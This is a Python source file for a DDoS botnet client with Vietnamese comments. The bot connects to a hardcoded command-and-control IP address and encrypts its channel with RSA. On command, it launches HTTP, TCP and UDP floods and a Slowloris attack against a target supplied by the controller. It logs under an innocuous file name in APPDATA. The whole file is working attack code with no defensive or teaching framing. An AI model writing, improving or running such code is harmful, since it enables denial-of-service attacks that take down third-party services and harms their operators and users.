import socket
import time
import signal
import sys
import http.client
import threading
import json
import os
import random
import logging
import argparse
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# Cấu hình logging
BOT_LOG = os.path.join(os.getenv('APPDATA'), "system_log.txt")
logging.basicConfig(filename=BOT_LOG, level=logging.INFO, format='%(asctime)s - %(message)s', encoding='utf-8')
logger = logging.getLogger()

EOF = '||EOF||'
CODE_00 = '00'

class Bot:
    def __init__(self, cnc_ip, cnc_port, offset, rate):
        logger.info('Initializing Bot...')
        signal.signal(signal.SIGINT, self.shutdown)
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.offset = offset
        self.rate = rate  # Đã được chuyển đổi sang giây từ tham số dòng lệnh
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        self.server_public_key = None
        self.connect_to_cnc()

    def serialize_public_key(self, public_key):
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode('utf-8')
        logger.info(f"Serialized public key: {pem}")
        return pem

    def deserialize_public_key(self, pem_data):
        try:
            return serialization.load_pem_public_key(
                pem_data.encode('utf-8'),
                backend=default_backend()
            )
        except Exception as e:
            logger.error(f"Failed to deserialize server public key: {e}")
            return None

    def encrypt_message(self, message):
        if not self.server_public_key:
            logger.error("No server public key available")
            return None
        encrypted = self.server_public_key.encrypt(
            message.encode('utf-8'),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted.hex()

    def decrypt_message(self, encrypted_hex):
        try:
            encrypted = bytes.fromhex(encrypted_hex)
            decrypted = self.private_key.decrypt(
                encrypted,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted.decode('utf-8')
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            return None

    def receive(self, connection, MSGLEN=4096):
        data = self.receive_raw(connection, MSGLEN)
        if not data:
            return None
        logger.info(f"Received encrypted: {data}")
        decrypted = self.decrypt_message(data)
        logger.info(f"Decrypted: {decrypted}")
        return decrypted if decrypted else None

    def send(self, connection, msg):
        encrypted = self.encrypt_message(msg)
        if not encrypted:
            return
        logger.info(f"Sending encrypted: {encrypted}")
        self.send_raw(connection, encrypted)

    def connect_to_cnc(self):
        while True:
            try:
                sock = socket.socket()
                sock.settimeout(60)
                sock.connect((self.cnc_ip, self.cnc_port))
                logger.info(f"Connected to C&C at {self.cnc_ip}:{self.cnc_port}")
                # Gửi khóa công khai
                self.send_raw(sock, self.serialize_public_key(self.public_key))
                # Nhận khóa công khai của server
                server_public_key_pem = self.receive_raw(sock)
                if not server_public_key_pem:
                    logger.error("No server public key received")
                    sock.close()
                    continue
                logger.info(f"Received server public key: {server_public_key_pem}")
                self.server_public_key = self.deserialize_public_key(server_public_key_pem)
                if not self.server_public_key:
                    logger.error("Failed to load server public key")
                    sock.close()
                    continue
                # Gửi vai trò
                self.send(sock, 'BOT')
                while True:
                    cmd = self.receive(sock)
                    if not cmd:
                        logger.error("Connection lost while waiting for command")
                        break
                    logger.info(f"Received command: {cmd}")
                    if cmd == CODE_00:
                        currTimeStr = str(int(time.time() * 1000) + self.offset)
                        logger.info(f"Sending bot time: {currTimeStr}")
                        self.send(sock, currTimeStr)
                        attack_config_raw = self.receive(sock)
                        if attack_config_raw:
                            logger.info(f"Raw attack config: {attack_config_raw}")
                            try:
                                attack_config = json.loads(attack_config_raw)
                                logger.info(f"Parsed attack config: {attack_config}")
                                self.start_attack(attack_config)
                            except json.JSONDecodeError as e:
                                logger.error(f"Error decoding attack config: {e}")
                        else:
                            logger.error("No attack config received")
                        break
                    else:
                        logger.warning(f"Unexpected command received: {cmd}")
                sock.close()
            except Exception as e:
                logger.error(f"Error connecting to C&C: {e}")
                time.sleep(10)

    def start_attack(self, attack_config):
        target = attack_config["target"]
        threads = []
        if attack_config.get("http_port"):
            threads.append(threading.Thread(target=self.http_flood, args=((target, attack_config["http_port"]),)))
        if attack_config.get("tcp_port"):
            threads.append(threading.Thread(target=self.tcp_flood, args=((target, attack_config["tcp_port"]),)))
        if attack_config.get("udp_port"):
            threads.append(threading.Thread(target=self.udp_flood, args=((target, attack_config["udp_port"]),)))
        if attack_config.get("slowloris_port"):
            threads.append(threading.Thread(target=self.slowloris, args=((target, attack_config["slowloris_port"]),)))
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        self.shutdown(None, None)

    def http_flood(self, target):
        logger.info('Starting HTTP Flood attack...')
        conn = http.client.HTTPConnection(target[0], target[1])
        timeout = 300
        startTime = time.time()
        while time.time() < startTime + timeout:
            try:
                conn.request("GET", "/")
                response = conn.getresponse()
                logger.info(f"HTTP Flood Response: {response.status} {response.reason}")
                time.sleep(self.rate)
            except Exception as e:
                logger.error(f"HTTP Flood Error: {e}")
        conn.close()
        logger.info('HTTP Flood attack finished.')

    def tcp_flood(self, target):
        logger.info('Starting TCP Flood attack...')
        timeout = 300
        startTime = time.time()
        while time.time() < startTime + timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(target)
                sock.send(os.urandom(1024))
                logger.info(f"TCP Flood: Sent packet to {target[0]}:{target[1]}")
                sock.close()
                time.sleep(self.rate)
            except Exception as e:
                logger.error(f"TCP Flood Error: {e}")
        logger.info('TCP Flood attack finished.')

    def udp_flood(self, target):
        logger.info('Starting UDP Flood attack...')
        timeout = 300
        startTime = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < startTime + timeout:
            try:
                sock.sendto(os.urandom(1024), target)
                logger.info(f"UDP Flood: Sent packet to {target[0]}:{target[1]}")
                time.sleep(self.rate)
            except Exception as e:
                logger.error(f"UDP Flood Error: {e}")
        sock.close()
        logger.info('UDP Flood attack finished.')

    def slowloris(self, target):
        logger.info('Starting Slowloris attack...')
        timeout = 300
        startTime = time.time()
        connections = []
        max_connections = 200
        keep_alive_interval = 5

        def send_initial_header(sock, target_ip):
            headers = [
                "GET / HTTP/1.1\r\n",
                f"Host: {target_ip}\r\n",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                "Connection: keep-alive\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "\r\n"
            ]
            for header in headers:
                sock.send(header.encode('utf-8'))
                time.sleep(0.01)

        try:
            for i in range(max_connections):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(15)
                    sock.connect(target)
                    send_initial_header(sock, target[0])
                    connections.append(sock)
                    logger.info(f"Slowloris: Opened connection {i + 1} to {target[0]}:{target[1]}")
                    time.sleep(0.05)
                except Exception as e:
                    logger.error(f"Slowloris Error (connection {i + 1}): {e}")

        except Exception as e:
            logger.error(f"Slowloris Error (initialization): {e}")

        try:
            while time.time() < startTime + timeout:
                for i, conn in enumerate(connections[:]):
                    try:
                        conn.send(f"X-Request-Id: {random.randint(1, 10000)}\r\n".encode('utf-8'))
                        logger.info(f"Slowloris: Sent keep-alive on connection {i + 1}")
                    except Exception as e:
                        logger.error(f"Slowloris Error (keep-alive {i + 1}): {e}")
                        connections.remove(conn)
                        if len(connections) < max_connections:
                            try:
                                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_sock.settimeout(15)
                                new_sock.connect(target)
                                send_initial_header(new_sock, target[0])
                                connections.append(new_sock)
                                logger.info(f"Slowloris: Reopened connection {i + 1} to {target[0]}:{target[1]}")
                            except Exception as new_e:
                                logger.error(f"Slowloris Error (reopen {i + 1}): {new_e}")
                time.sleep(keep_alive_interval / max_connections)

        finally:
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            logger.info('Slowloris attack finished.')

    def shutdown(self, signum, frame):
        logger.info('Bot shut down')
        sys.exit(0)

    def receive_raw(self, connection, MSGLEN=4096):
        recvdStr = []
        recvdStrLen = 0
        try:
            while recvdStrLen < MSGLEN:
                recvdSubstring = connection.recv(MSGLEN - recvdStrLen).decode('utf-8', errors='ignore')
                if not recvdSubstring:
                    break
                recvdStr.append(recvdSubstring)
                recvdStrLen += len(recvdSubstring)
                if EOF in recvdSubstring:
                    break
            data = ''.join(recvdStr).split(EOF)[0]
            return data if data else None
        except socket.error as e:
            logger.error(f"Receive error: {e}")
            return None

    def send_raw(self, connection, msg):
        connection.send((msg + EOF).encode('utf-8'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start Bot.')
    parser.add_argument('-c', '--cnc-ip', dest='cnc_ip', action='store', required=False, default='18.142.246.109', help='IP address of the C&C server. Default is 18.142.246.109.')
    parser.add_argument('-p', '--cnc-port', dest='cnc_port', action='store', type=int, required=False, default=5001, help='Port of the C&C server. Default is 5001.')
    parser.add_argument('-o', '--offset', dest='offset', action='store', type=int, required=False, help='Offset from actual time. Default is 0.', default=0)
    parser.add_argument('-r', '--rate', dest='rate', action='store', type=float, required=False, help='Attack rate in ms. Default is 1.', default=1)
    args = parser.parse_args()
    cnc_ip = args.cnc_ip
    cnc_port = args.cnc_port
    offset = args.offset
    rate = args.rate / 1000  # Chuyển đổi từ ms sang giây
    logger.info("[BOT] Bot khởi động thành công!")
    bot = Bot(cnc_ip, cnc_port, offset, rate)